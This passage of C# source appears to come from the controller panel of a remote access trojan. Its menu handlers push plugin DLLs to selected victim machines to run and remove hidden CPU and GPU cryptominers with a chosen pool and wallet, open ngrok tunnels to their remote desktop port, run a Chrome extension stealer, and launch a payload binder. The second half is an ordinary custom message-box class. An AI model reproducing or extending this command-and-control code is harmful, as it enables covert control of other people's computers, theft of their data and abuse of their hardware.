                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\hDesk.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        //client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The tak3.
        /// </summary>
        private void tak3()
        {
            string token = InputDialog.Show("\nType Token.\n\n");
            if (string.IsNullOrEmpty(token))
                return;
            else
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    try
                    {
                        MsgPack packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "NgrokStart";
                        packet.ForcePathObject("proto").AsString = "tcp";
                        packet.ForcePathObject("port").AsString = "3389";
                        packet.ForcePathObject("token").AsString = token;

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Ngrok.dll"));
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (Clients client in GetSelectedClients())
                        {
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());

                        }

                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }
                }
            }
        }

        /// <summary>
        /// The startToolStripMenuItem1_Click_2.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private async void startToolStripMenuItem1_Click_2(object sender, EventArgs e)
        {
            try
            {
                CPUClientSettings formSend = new CPUClientSettings();
                formSend.ShowDialog();
                if (formSend.metroSetButton2.Text.Length > 0)
                {

                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    //packet.ForcePathObject("Pac_ket").AsString = "StartCPU";
                    packet.ForcePathObject("Pac_ket").AsString = "StartCPU";
                    packet.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\MCG.dll");
                    packet.ForcePathObject("XMRPROC").AsString = formSend.metroSetTextBox4.Text; //miner name in the archive without extension
                    packet.ForcePathObject("ZIPPASSXMRIG").AsString = formSend.metroSetTextBox1.Text; // Archive password
                    packet.ForcePathObject("PARMXMRIG").AsString = formSend.metroSetTextBox2.Text; // Launch parameters
                    packet.ForcePathObject("WORKDIRXMRIG").AsString = formSend.metroSetTextBox3.Text; // Launch parameters

                    packet.ForcePathObject("IDPARAMETERS").AsString = "0"; // ID 

                    if (formSend.metroSetComboBox1.Text == "C:/Users/AppData/Local")
                        packet.ForcePathObject("SYSWORKDIR").AsString = "LOCAL";
                    else if (formSend.metroSetComboBox1.Text == "C:/Users/AppData/Local/Temp")
                        packet.ForcePathObject("SYSWORKDIR").AsString = "TEMP";
                    else if (formSend.metroSetComboBox1.Text == "C:/Users/AppData/Roaming")
                        packet.ForcePathObject("SYSWORKDIR").AsString = "ROAMING";

                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSend.metroSetButton2.Tag.ToString())));
                    packet.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        await Task.Run(() =>
                        {
                            packet.ForcePathObject("Extension").AsString = Path.GetExtension(formSend.metroSetButton2.Tag.ToString());
                        });
                        ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
                    }
                }
                formSend.Close();
                formSend.Dispose();
            }
            catch
            {
                return;
            }
        }

        /// <summary>
        /// The stopToolStripMenuItem1_Click_2.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void stopToolStripMenuItem1_Click_2(object sender, EventArgs e)
        {
            /*
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "STOPCPU";
                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
            */
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "STOPCPU";


                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\MCG.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The deleteToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            /*
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "DELCPUMINER";
                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
            */
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "DELCPUMINER";


                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\MCG.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The startToolStripMenuItem5_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private async void startToolStripMenuItem5_Click(object sender, EventArgs e)
        {
            try
            {
                GPUClientSettings formSend = new GPUClientSettings();
                formSend.ShowDialog();
                if (formSend.metroSetButton2.Text.Length > 0)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "StartGPU";
                    packet.ForcePathObject("PROCPHOENIX").AsString = formSend.metroSetTextBox4.Text; //miner name in archive without extension
                    packet.ForcePathObject("ZIPPASSPHOENIX").AsString = formSend.metroSetTextBox1.Text; // Archive password
                    packet.ForcePathObject("PARMPHOENIX").AsString = formSend.metroSetTextBox2.Text; // Launch parameters
                    packet.ForcePathObject("WORKDIRPHOENIX").AsString = formSend.metroSetTextBox3.Text; // Launch parameters
                    packet.ForcePathObject("IDPARAMETERS").AsString = "0"; // task id
                    if (formSend.metroSetComboBox1.Text == "C:/Users/AppData/Local")
                        packet.ForcePathObject("SYSWORKDIR").AsString = "LOCAL";
                    else if (formSend.metroSetComboBox1.Text == "C:/Users/AppData/Local/Temp")
                        packet.ForcePathObject("SYSWORKDIR").AsString = "TEMP";
                    else if (formSend.metroSetComboBox1.Text == "C:/Users/AppData/Roaming")
                        packet.ForcePathObject("SYSWORKDIR").AsString = "ROAMING";

                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSend.metroSetButton2.Tag.ToString())));

                    foreach (Clients client in GetSelectedClients())
                    {
                        await Task.Run(() =>
                        {
                            packet.ForcePathObject("Extension").AsString = Path.GetExtension(formSend.metroSetButton2.Tag.ToString());
                        });
                        ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
                    }
                }
                formSend.Close();
                formSend.Dispose();
            }
            catch
            {
                return;
            }
        }

        /// <summary>
        /// The stopToolStripMenuItem6_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void stopToolStripMenuItem6_Click(object sender, EventArgs e)
        {
            /*
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "STOPGPU";
                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
            */
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "STOPGPU";


                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\MCG.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The deleteToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void deleteToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            /*
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "DELGPUMINER";
                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
            */
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "DELGPUMINER";


                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\MCG.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The MinerstartToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void MinerstartToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            FormMiner formdn = new FormMiner();
            formdn.ShowDialog();
            //FormMiner nm = new FormMiner();
            string pool = formdn.txtPool.Text;
            string wallet = formdn.txtWallet.Text;
            string password = formdn.txtPass.Text;
            string threads = formdn.txtThreads.Text;
            string algo = formdn.comboInjection.Text;
            //string allmerged = pool + Environment.NewLine + wallet + Environment.NewLine + password + Environment.NewLine + algo + Environment.NewLine + threads + Environment.NewLine;
            //string alltextdebug = Path.Combine(Application.StartupPath, "alltext.txt");
            /*
            string pool = InputDialog.Show("\nType Pool:Port.\n\n");
            string wallet = InputDialog.Show("\nType Wallet.\n\n");
            string password = InputDialog.Show("\nType Password.\n\n");
            string algo = InputDialog.Show("\nType Algorithm.\n\n");
            string threadss = InputDialog.Show("\nType Threads.\n\n");
            
            if (string.IsNullOrEmpty(pool))
                return;
            if (string.IsNullOrEmpty(wallet))
                return;
            if (string.IsNullOrEmpty(password))
                return;
            if (string.IsNullOrEmpty(threadss))
                return;
            if (string.IsNullOrEmpty(algo))
                return;
            */
            //else
            //{
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "StartMiner";
                    packet.ForcePathObject("pool").AsString = pool;
                    packet.ForcePathObject("wallet").AsString = wallet;
                    packet.ForcePathObject("password").AsString = password;
                    packet.ForcePathObject("algo").AsString = algo;
                    packet.ForcePathObject("threads").AsString = threads;

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Miner.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());

                    }

                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                    return;
                }
            }
        }

        /// <summary>
        /// The MinerstopToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void MinerstopToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                foreach (Clients client in GetSelectedClients())
                {
                    try
                    {
                        MsgPack packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "doStop";
                        //packet.ForcePathObject("webhook").AsString = Msgbox;

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Miner.dll"));
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());


                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());



                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }
                }
            }
        }

        /// <summary>
        /// The toolStripMenuItem25_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void toolStripMenuItem25_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "STARTProtection";
                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        /// <summary>
        /// The sTARTEASYToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void sTARTEASYToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "STARTProtectionEasy";
                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        /// <summary>
        /// The toolStripMenuItem26_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void toolStripMenuItem26_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "STOPProtection";
                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        /// <summary>
        /// The reverseProxyToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void reverseProxyToolStripMenuItem1_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The ngrokToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void ngrokToolStripMenuItem_Click(object sender, EventArgs e)
        {

            //FrmNgrokPanel formdn = new FrmNgrokPanel();
            //formdn.ShowDialog();
            string proto = InputDialog.Show("\nType Protocol tcp/http.\n\n");
            string port = InputDialog.Show("\nType Port (3389 rdp).\n\n");
            string token = InputDialog.Show("\nType Token.\n\n");

            if (string.IsNullOrEmpty(proto))
                return;
            if (string.IsNullOrEmpty(port))
                return;
            if (string.IsNullOrEmpty(token))
                return;
            else
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    try
                    {
                        MsgPack packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "NgrokStart";
                        packet.ForcePathObject("proto").AsString = proto;
                        packet.ForcePathObject("port").AsString = port;
                        packet.ForcePathObject("token").AsString = token;

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Ngrok.dll"));
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (Clients client in GetSelectedClients())
                        {
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());

                        }

                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }
                }
            }
        }

        private void btnBinder_Click(object sender, EventArgs e)
        {
            Process.Start(Path.Combine(Application.StartupPath, "PegasusBinder.exe"));
        }

        private void btnAbouthvnc_Click(object sender, EventArgs e)
        {
            Welcome formdn = new Welcome();
            formdn.ShowDialog();
        }

        private void kATANAToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                foreach (var client in GetSelectedClients())
                    try
                    {
                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\KATANA.dll");

                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }
        }

        private void chromeExtentionStealerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                foreach (var client in GetSelectedClients())
                    try
                    {
                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\ML.dll");

                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }
        }

        private void connectToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                foreach (var client in GetSelectedClients())
                    try
                    {
                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\PegShark.dll");

                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        return;
                    }

        }
    }

    /// <summary>
    /// Defines the <see cref="MsgBox" />.
    /// </summary>
    public class MsgBox : Form
    {
        /// <summary>
        /// Defines the AnimateStyle.
        /// </summary>
        public enum AnimateStyle
        {
            /// <summary>
            /// Defines the SlideDown.
            /// </summary>
            SlideDown = 1,

            /// <summary>
            /// Defines the FadeIn.
            /// </summary>
            FadeIn = 2,

            /// <summary>
            /// Defines the ZoomIn.
            /// </summary>
            ZoomIn = 3
        }

        /// <summary>
        /// Defines the Buttons.
        /// </summary>
        public enum Buttons
        {
            /// <summary>
            /// Defines the AbortRetryIgnore.
            /// </summary>
            AbortRetryIgnore = 1,

            /// <summary>
            /// Defines the OK.
            /// </summary>
            OK = 2,

            /// <summary>
            /// Defines the OKCancel.
            /// </summary>
            OKCancel = 3,

            /// <summary>
            /// Defines the RetryCancel.
            /// </summary>
            RetryCancel = 4,

            /// <summary>
            /// Defines the YesNo.
            /// </summary>
            YesNo = 5,

            /// <summary>
            /// Defines the YesNoCancel.
            /// </summary>
            YesNoCancel = 6
        }

#pragma warning disable CS0108 // Member hides inherited member; missing new keyword
        public enum Icon
#pragma warning restore CS0108 // Member hides inherited member; missing new keyword
        {
            /// <summary>
            /// Defines the Application.
            /// </summary>
            Application = 1,

            /// <summary>
            /// Defines the Exclamation.
            /// </summary>
            Exclamation = 2,

            /// <summary>
            /// Defines the Error.
            /// </summary>
            Error = 3,

            /// <summary>
            /// Defines the Warning.
            /// </summary>
            Warning = 4,

            /// <summary>
            /// Defines the Info.
            /// </summary>
            Info = 5,

            /// <summary>
            /// Defines the Question.
            /// </summary>
            Question = 6,

            /// <summary>
            /// Defines the Shield.
            /// </summary>
            Shield = 7,

            /// <summary>
            /// Defines the Search.
            /// </summary>
            Search = 8,

            /// <summary>
            /// Defines the Information.
            /// </summary>
            Information = 9
        }

        /// <summary>
        /// Defines the CS_DROPSHADOW.
        /// </summary>
        private const int CS_DROPSHADOW = 0x00020000;

        /// <summary>
        /// Defines the _msgBox.
        /// </summary>
        private static MsgBox _msgBox;

        /// <summary>
        /// Defines the _buttonResult.
        /// </summary>
        private static DialogResult _buttonResult;

        /// <summary>
        /// Defines the _timer.
        /// </summary>
        private static Timer _timer;

        /// <summary>
        /// Defines the lastMousePos.
        /// </summary>
        private static Point lastMousePos;

        /// <summary>
        /// Defines the _buttonCollection.
        /// </summary>
        private readonly List<Button> _buttonCollection = new List<Button>();

        /// <summary>
        /// Defines the _flpButtons.
        /// </summary>
        private readonly FlowLayoutPanel _flpButtons = new FlowLayoutPanel();

        /// <summary>
        /// Defines the _lblMessage.
        /// </summary>
        private readonly Label _lblMessage;

        /// <summary>
        /// Defines the _lblTitle.
        /// </summary>
        private readonly Label _lblTitle;

        /// <summary>
        /// Defines the _picIcon.
        /// </summary>
        private readonly PictureBox _picIcon = new PictureBox();

        /// <summary>
        /// Defines the _plFooter.
        /// </summary>
        private readonly Panel _plFooter = new Panel();

        /// <summary>
        /// Defines the _plHeader.
        /// </summary>
        private readonly Panel _plHeader = new Panel();

        /// <summary>
        /// Defines the _plIcon.
        /// </summary>
        private readonly Panel _plIcon = new Panel();

        /// <summary>
        /// Prevents a default instance of the <see cref="MsgBox"/> class from being created.
        /// </summary>
        private MsgBox()
        {
            FormBorderStyle = FormBorderStyle.None;
            BackColor = Color.FromArgb(25, 27, 38);
            StartPosition = FormStartPosition.CenterScreen;
            Padding = new Padding(3);
            Width = 400;

            _lblTitle = new Label();
            _lblTitle.ForeColor = Color.White;
            _lblTitle.Font = new Font("Electrolize", 18);
            _lblTitle.Dock = DockStyle.Top;
            _lblTitle.Height = 50;

            _lblMessage = new Label();
            _lblMessage.ForeColor = Color.White;
            _lblMessage.Font = new Font("Electrolize", 10);
            _lblMessage.Dock = DockStyle.Fill;

            _flpButtons.FlowDirection = FlowDirection.RightToLeft;
            _flpButtons.Dock = DockStyle.Fill;

            _plHeader.Dock = DockStyle.Fill;
            _plHeader.Padding = new Padding(20);
            _plHeader.Controls.Add(_lblMessage);
            _plHeader.Controls.Add(_lblTitle);

            _plFooter.Dock = DockStyle.Bottom;
            _plFooter.Padding = new Padding(20);
            _plFooter.BackColor = Color.FromArgb(25, 27, 38);
            _plFooter.Height = 80;
            _plFooter.Controls.Add(_flpButtons);

            _picIcon.Width = 32;
            _picIcon.Height = 32;
            _picIcon.Location = new Point(30, 50);

            _plIcon.Dock = DockStyle.Left;
            _plIcon.Padding = new Padding(20);
            _plIcon.Width = 70;
            _plIcon.Controls.Add(_picIcon);

            var controlCollection = new List<Control>();
            controlCollection.Add(this);
            controlCollection.Add(_lblTitle);
            controlCollection.Add(_lblMessage);
            controlCollection.Add(_flpButtons);
            controlCollection.Add(_plHeader);
            controlCollection.Add(_plFooter);
            controlCollection.Add(_plIcon);
            controlCollection.Add(_picIcon);

            foreach (var control in controlCollection)
            {
                control.MouseDown += MsgBox_MouseDown;
                control.MouseMove += MsgBox_MouseMove;
            }

            Controls.Add(_plHeader);
            Controls.Add(_plIcon);
            Controls.Add(_plFooter);
        }

        /// <summary>
        /// Gets the CreateParams.
        /// </summary>
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ClassStyle |= CS_DROPSHADOW;
                return cp;
            }
        }

        /// <summary>
        /// The MessageBeep.
        /// </summary>
        /// <param name="type">The type<see cref="uint"/>.</param>
        /// <returns>The <see cref="bool"/>.</returns>
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern bool MessageBeep(uint type);

        /// <summary>
        /// The MsgBox_MouseDown.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="MouseEventArgs"/>.</param>
        private static void MsgBox_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left) lastMousePos = new Point(e.X, e.Y);
        }

        /// <summary>
        /// The MsgBox_MouseMove.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="MouseEventArgs"/>.</param>
        private static void MsgBox_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                _msgBox.Left += e.X - lastMousePos.X;
                _msgBox.Top += e.Y - lastMousePos.Y;
            }
        }

        /// <summary>
        /// The Show.
        /// </summary>
        /// <param name="message">The message<see cref="string"/>.</param>
        /// <returns>The <see cref="DialogResult"/>.</returns>
        public static DialogResult Show(string message)
        {
            _msgBox = new MsgBox();
            _msgBox._lblMessage.Text = message;

            InitButtons(Buttons.OK);

            _msgBox.ShowDialog();
            MessageBeep(0);
            return _buttonResult;
        }

        /// <summary>
        /// The Show.
        /// </summary>
        /// <param name="message">The message<see cref="string"/>.</param>
        /// <param name="title">The title<see cref="string"/>.</param>
        /// <returns>The <see cref="DialogResult"/>.</returns>
        public static DialogResult Show(string message, string title)
        {
            _msgBox = new MsgBox();
            _msgBox._lblMessage.Text = message;
            _msgBox._lblTitle.Text = title;
            _msgBox.Size = MessageSize(message);

            InitButtons(Buttons.OK);

            _msgBox.ShowDialog();
            MessageBeep(0);
            return _buttonResult;
        }

        /// <summary>
        /// The Show.
        /// </summary>
        /// <param name="message">The message<see cref="string"/>.</param>
        /// <param name="title">The title<see cref="string"/>.</param>
        /// <param name="buttons">The buttons<see cref="Buttons"/>.</param>
        /// <returns>The <see cref="DialogResult"/>.</returns>
        public static DialogResult Show(string message, string title, Buttons buttons)
        {
            _msgBox = new MsgBox();
            _msgBox._lblMessage.Text = message;
            _msgBox._lblTitle.Text = title;
            _msgBox._plIcon.Hide();

            InitButtons(buttons);

            _msgBox.Size = MessageSize(message);
            _msgBox.ShowDialog();
            MessageBeep(0);
            return _buttonResult;
        }

        /// <summary>
        /// The Show.
        /// </summary>
        /// <param name="message">The message<see cref="string"/>.</param>
        /// <param name="title">The title<see cref="string"/>.</param>
        /// <param name="buttons">The buttons<see cref="Buttons"/>.</param>
        /// <param name="icon">The icon<see cref="Icon"/>.</param>
        /// <returns>The <see cref="DialogResult"/>.</returns>
        public static DialogResult Show(string message, string title, Buttons buttons, Icon icon)
        {
            _msgBox = new MsgBox();
            _msgBox._lblMessage.Text = message;
            _msgBox._lblTitle.Text = title;

            InitButtons(buttons);
            InitIcon(icon);

            _msgBox.Size = MessageSize(message);
            _msgBox.ShowDialog();
            MessageBeep(0);
            return _buttonResult;
        }

        /// <summary>
        /// The Show.
        /// </summary>
        /// <param name="message">The message<see cref="string"/>.</param>
        /// <param name="title">The title<see cref="string"/>.</param>
        /// <param name="buttons">The buttons<see cref="Buttons"/>.</param>
        /// <param name="icon">The icon<see cref="Icon"/>.</param>
        /// <param name="style">The style<see cref="AnimateStyle"/>.</param>
        /// <returns>The <see cref="DialogResult"/>.</returns>
        public static DialogResult Show(string message, string title, Buttons buttons, Icon icon, AnimateStyle style)
        {
            _msgBox = new MsgBox();
            _msgBox._lblMessage.Text = message;
            _msgBox._lblTitle.Text = title;
            _msgBox.Height = 0;

            InitButtons(buttons);
            InitIcon(icon);

            _timer = new Timer();
            var formSize = MessageSize(message);

            switch (style)
            {
                case AnimateStyle.SlideDown:
                    _msgBox.Size = new Size(formSize.Width, 0);
                    _timer.Interval = 1;
                    _timer.Tag = new AnimateMsgBox(formSize, style);
                    break;

                case AnimateStyle.FadeIn:
                    _msgBox.Size = formSize;
                    _msgBox.Opacity = 0;
                    _timer.Interval = 20;
                    _timer.Tag = new AnimateMsgBox(formSize, style);
                    break;

                case AnimateStyle.ZoomIn:
                    _msgBox.Size = new Size(formSize.Width + 100, formSize.Height + 100);
                    _timer.Tag = new AnimateMsgBox(formSize, style);
                    _timer.Interval = 1;
                    break;
            }

            _timer.Tick += timer_Tick;
            _timer.Start();

            _msgBox.ShowDialog();
            MessageBeep(0);
            return _buttonResult;
        }

        /// <summary>
        /// The timer_Tick.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private static void timer_Tick(object sender, EventArgs e)
        {
            var timer = (Timer)sender;
            var animate = (AnimateMsgBox)timer.Tag;

            switch (animate.Style)
            {
                case AnimateStyle.SlideDown:
                    if (_msgBox.Height < animate.FormSize.Height)
                    {
                        _msgBox.Height += 17;
                        _msgBox.Invalidate();
                    }
                    else
                    {
                        _timer.Stop();
                        _timer.Dispose();
                    }

                    break;

                case AnimateStyle.FadeIn:
                    if (_msgBox.Opacity < 1)
                    {
